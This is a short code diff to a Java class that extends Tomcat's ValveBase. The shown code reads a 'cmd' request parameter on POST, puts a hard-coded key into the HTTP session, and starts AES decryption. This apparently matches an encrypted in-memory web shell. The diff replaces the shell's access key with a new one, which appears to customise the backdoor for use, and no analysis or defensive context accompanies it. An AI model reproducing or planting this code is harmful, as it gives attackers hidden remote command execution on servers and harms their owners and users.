@@ -21,7 +21,7 @@ public class Valveimpl extends ValveBase {
             if (cmd != null && !cmd.equals("")) {
                 if (request.getMethod().equals("POST")) {
                     try {
-                        String k = "e45e329feb5d925b";
+                        String k = "318c9ede6468af74";
                         HttpSession session = (HttpSession) request.getSession();
                         session.putValue("u", k);
                         Cipher c = Cipher.getInstance("AES");
